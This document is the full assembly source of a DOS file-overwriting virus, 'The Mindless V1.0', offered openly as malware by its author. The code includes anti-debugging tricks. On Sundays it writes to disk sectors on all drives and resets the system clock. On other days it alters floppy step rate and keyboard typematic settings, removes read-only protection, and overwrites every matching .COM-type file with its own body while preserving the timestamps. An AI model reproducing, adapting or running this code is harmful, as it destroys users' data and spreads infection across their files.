;	The Mindless V1.0 Virus 
;
;	Type:  *.COM Overwriter
;
;	Programmer:  Natas Kaupas

;	Notes:
;
;		Read the texts that come with this for all of the necessary 
;	info...if you've got any questions contact me on any YAM Dist. Sites.
;
;	I Couldn't Have Made This Without:
;
;	Soltan Griss		-Kode4
;	Data Disruptor		-encrypted part
;	Mr. Mike		-typematic delay thing	
;	And Everyone I Forgot!

seg_a   	segment byte public
		assume  cs:seg_a, ds:seg_a
		org     100h


MINDL           proc    far       
start           label   near               
		db	0E9h,00h,00h
		
vstart		equ	$

	mov	cx,09EBh		;debug killer
	mov	ax,0FE05h		;
	jmp	$-2			;
	add	ah,03Bh			;
	jmp	$-10			;

        push    ds       	;save old data segment
        sub     ax,ax    	;put zero in ax
        push    ax       	;save it on stack

	mov	ah,2ah			;get date
	int	21h
	cmp	al,0			;is it a Sunday?
	jne	rater			;no...don't format then

doom:
	mov	ax,3301h		;turn off ^C Check
	xor	dl,dl			;0
	int	21h

	mov	cx,lident		;this all has to do with the encrypted
	mov	si,offset ident		;message
	mov	di,offset dest		;
doshit:
	mov	al,ds:[si]			;unencrypt message
	mov	temp,al				;
	xor	byte ptr ds:[temp],01h		;
	mov	al,temp				;
	mov	[di],al				;
	inc	si				;
	inc	di				;
	loop	doshit				;loop back and finish it
doomb:
	cmp	drive,27		;format all drives
	jge	boot			;done...then end (boot)
	pushf				;push flags on
	mov	al,drive		;find drive
	mov	cx,sectors		;find sectors
	mov	dx,0			;start at sector 0
	mov	bx,offset dest		;write encrypted message
	int	26h			;format
	popf				;pop flags off
	inc	drive			;go up to next drive
	jmp	doomb			;repeat

;this was originally going to boot...but for some reason it couldn't format in 
;time (before the boot), so it didn't format...oh well.

boot:
	mov	dl,2ch		;get system time
	int	21h
	and	dl,0Fh		;AND 100th seconds by 0Fh
	or	dl,dl		;0?
	jz	locker		;yes..then lock up system

	mov	cx,1980			;date, 1980
	mov	dx,0			;mon/day, 0
	mov	ah,2Bh			;set date
	int	21h
	mov	cx,0			;hrs/min, 0
	mov	dx,0			;sec, 0
	mov	ah,2Dh			;set time
	int	21h
	mov	ax,3301h		;turn ^C Check back on
	mov	dl,1			;1
	int	21h
	mov	ax,4c00h		;end with error message 00
	int	21h

locker:
	jmp	$			;lock up computer	

rater:
	mov	al,dl
	mov	dl,0c0h		;unkown ms, really grinds on mine though!
	jz	valid		;it must be around 15ms
				;which is slow considering default is 9ms
				;and most floppies can actually go under 6ms

valid:
        push    ds       	;Save the data segment
        mov     bx,78h   	;point to pointer for floppy drive tables
        mov     ax,0
        mov     ds,ax    	;set to segment 0
        mov     ax,[bx]  	;get the pointer
        mov     bx,ax    	;into the bx register
        mov     al,[bx]  	;now get the present step rate
        and     al,0fh   	;remove the old step rate
        or      al,dl    	;put in the new step rate
        mov     [bx],al  	;and put it back where it goes
        mov     ah,0     	;now call on the BIOS to
        int     13h      	;reload the set floppy disk controller
        pop     ds       	;Reset the Data Segment

go_on:

	push	ds		;save present data segment

	mov	bx,78h		;point to pointer for floppy drive tables
	mov	ax,0
	mov	ds,ax		;set to segment 0
	mov	ax,[bx]		;get the pointer
	mov	bx,ax		;into the bx register
	mov	al,[bx]		;now get the step rate
	pop	ds
	push	ax		;save the step rate on the stack


typematic:
	mov	bl,repeat		;get the parameters
	mov	bh,init			;
	mov	ax,305h			;set typematic rate and delay
	int	16h			;
	xor	al,al			;errorlevel = 0

n_start:	mov     ah,4Eh             ;Find first Com file in directory  
		mov     dx,offset filename ;use "*.com"     
		int     21h                
					  
Back:                                       
		mov     ah,43h              ;get rid of read only protection
		mov     al,0		    ;	
		mov     dx,9eh		    ;
		int     21h		    ;	
		mov     ah,43h		    ;
		mov     al,01		    ;
		and     cx,11111110b	    ;
		int     21h		    ;
		
		mov     ax,3D01h           ;Open file for writing
		mov     dx,9Eh             ;get file name from file data area
		int     21h                  
					      
		mov     bx,ax               ;save handle in bx
		mov     ah,57h              ;get time date
		mov     al,0
		int     21h
		
		push    cx                  ;put in stack for later
		push    dx


		mov     dx,100h            ;Start writing at 100h
		mov     cx,(vend-vstart)        ;write ?? bytes
		mov     ah,40h             ;Write Data into the file
		int     21h                   
					      
					      
		pop     dx                 ;Restore old dates and times 
		pop     cx
		mov     ah,57h
		mov     al,01h
		int     21h



		mov     ah,3Eh             ;Close the file
		int     21h                   
					       
		mov     ah,4Fh             ;Find Next file
		int     21h                    
						
		jnc     Back               

done:	

           int     20h                ;Terminate Program

V_Length        equ     vend-vstart

drive	db	?
sectors	dw	456

filename        db      "*.c*",0                     

ident	db	"ZXntofrudsr!@f`horu!Lb@ggdd\!,O@U@R!J@TQ@R",13,10
	db	"Uid!Lhoemdrr!Whstr!w0/1!",13,10

;encrypted message:
;ident	db	"[Youngsters Against McAffee] -NATAS KAUPAS",13,10
;	db	"The Mindless Virus v1.0 ",13,10

lident	equ	$-ident
dest	db	[lident-1/2] dup (?)
temp	db	0

repeat		equ	250
init		equ	0

mindl           endp

vend		equ	$

seg_a           ends

		end     start


